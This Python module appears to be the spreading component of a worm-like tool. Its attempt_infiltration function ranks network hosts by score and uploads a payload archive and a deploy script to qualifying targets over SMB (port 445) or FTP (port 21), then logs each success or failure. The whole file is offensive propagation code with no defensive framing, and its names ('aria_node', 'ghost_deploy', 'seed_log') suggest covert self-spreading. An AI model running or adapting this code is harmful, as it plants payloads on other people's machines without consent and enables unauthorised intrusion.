import json
import time
from net.transport_smb import try_smb_upload
from net.transport_ftp import try_ftp_upload
from net.seed_decider import prioritize

PRIORITY_FILE = "priority_targets.json"
SEED_LOG = "seed_log.json"
PAYLOAD_ZIP = "aria_node.zip"
DEPLOY_SCRIPT = "ghost_deploy.py"
DEPLOY_THRESHOLD = 3  # only deploy to hosts scoring >= this

def log_result(ip, method, success, reason):
    try:
        with open(SEED_LOG, "r") as f:
            data = json.load(f)
    except:
        data = []

    data.append({
        "ip": ip,
        "method": method,
        "success": success,
        "reason": reason,
        "time": int(time.time())
    })

    with open(SEED_LOG, "w") as f:
        json.dump(data, f, indent=2)

def attempt_infiltration():
    ranked = prioritize()
    for entry in ranked:
        ip = entry["ip"]
        ports = entry["ports"]
        score = entry["score"]
        reason = entry["reason"]

        if score < DEPLOY_THRESHOLD:
            print(f"[⏭] Skipping {ip} (score={score}): {reason}")
            continue

        if 445 in ports:
            print(f"[→] Trying SMB: {ip}")
            success = try_smb_upload(ip, PAYLOAD_ZIP, DEPLOY_SCRIPT)
            log_result(ip, "SMB", success, reason)
        elif 21 in ports:
            print(f"[→] Trying FTP: {ip}")
            success = try_ftp_upload(ip, PAYLOAD_ZIP, DEPLOY_SCRIPT)
            log_result(ip, "FTP", success, reason)

if __name__ == "__main__":
    attempt_infiltration()
